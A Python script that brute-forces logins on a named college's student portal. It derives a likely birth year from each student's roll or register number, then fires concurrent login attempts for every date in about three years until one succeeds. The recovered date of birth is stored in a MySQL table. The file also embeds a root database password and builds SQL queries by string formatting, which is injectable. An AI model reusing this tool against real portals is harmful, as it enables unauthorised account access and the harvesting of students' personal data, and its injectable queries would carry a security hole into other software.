from aiohttp import ClientSession
import mysql.connector
import asyncio
from os import getcwd
from sys import path
path.append(getcwd().rstrip('kcg'))
from darkglance import DobNotFound
from requests import Session
from bs4 import BeautifulSoup
import json

student_login_url = 'http://studentlogin.kcgcollege.ac.in/'
student_login_payload = {}


def get_payload():
    global student_login_payload
    
    with open('student_login_payload.json', 'r') as f:
            student_login_payload = json.load(f)

time_out_dates = [] 



def get_years(u_id, reg_no_):
    if reg_no_:       
        year = 2000 + int(u_id[4:6]) #year from register number                   
    else:            
        year = 2000 + int(u_id[:2])  #year from roll number  
            
    yob = year - 18
    years = (str(yob), str(yob + 1), str(yob - 1))
    #years = (str(yob + 1),)
    #print(years)
    return years  

async def check_date(session, The_day_):
    #print(The_day_)

    global time_out_dates, student_login_payload

    student_login_payload['txtpassword'] = The_day_
                
    try:
        page = await session.post(student_login_url, data = student_login_payload, timeout = 10)
        temp_url = str(page.url)
        #print(The_day_)
    except:
        temp_url = student_login_url
                       
        

    #print(page.url)
    if temp_url != student_login_url: 
        #print('dob found 1')        
        print(The_day_)  
        #print('dob found 2')             
        return The_day_
    
    return False 


async def find_student_dob(user_id, year_of_birth = None):

    mycon = mysql.connector.connect(host = "localhost", passwd = "rootmysql",user = "root", database = 'kcg', autocommit = True)
    mysql_cursor = mycon.cursor()

    mysql_cursor.execute("select * from dobs where id = '{}'".format(user_id))
    data = mysql_cursor.fetchall()
    
    if data != []:
        mysql_cursor.close()
        mycon.close()
        return data[0][1]
    else:
        get_payload()
        reg_no_ = False

        if user_id[:4] == '3110' :
            student_login_payload['rblOnlineAppLoginMode'] = '1'
            reg_no_ = True   
        else:
            student_login_payload['rblOnlineAppLoginMode'] = '0'
            reg_no_ = False     

        months = {
            '01' : 31, '02' : 29, '03' : 31, '04' : 30,
            '05' : 31, '06' : 30, '07' : 31, '08' : 31,
            '09' : 30, '10' : 31, '11' : 30, '12' : 31,
        }

        student_login_payload['txtuname'] = user_id
        The_day = None
        #print(reg_no_)
        if year_of_birth == None:
            years = get_years(user_id, reg_no_)
            #input()
        else:
            years = (year_of_birth,)         
        
        tasks = []
        
        async with ClientSession() as session:

            for str_yob in years:
                for str_month in ('01','02','03','04','05','06','07','08','09','10','11','12'):
                    days = months[str_month]

                    for day in range(1,days + 1):
                        str_day = str(day)
                        if len(str_day) == 1:
                            str_day = '0' + str_day

                        The_day = str_day + str_month + str_yob
                        tasks.append(asyncio.create_task(check_date(session, The_day)))

            list_ = await asyncio.gather(*tasks)

            for a in list_:
                if a != False:
                    dob = a                     
                    try:
                        mysql_cursor.execute("INSERT INTO dobs VALUES('{}','{}')".format(user_id,dob))
                        #print('dob found 4')
                    except Exception as text:
                        logger.exception_logs('dgb/kcg/finddob/find_student_dob', text, getcwd().rstrip('kcg') + 'logger')

                    mysql_cursor.close()
                    mycon.close()
                    #print(dob)
                    return dob                   
        
    raise DobNotFound   

'''
async def s():
    print(await find_student_dob('21ft23', '2000'))

asyncio.run(s())
'''

#find_student_dob('311020104023', '2003')                        
            



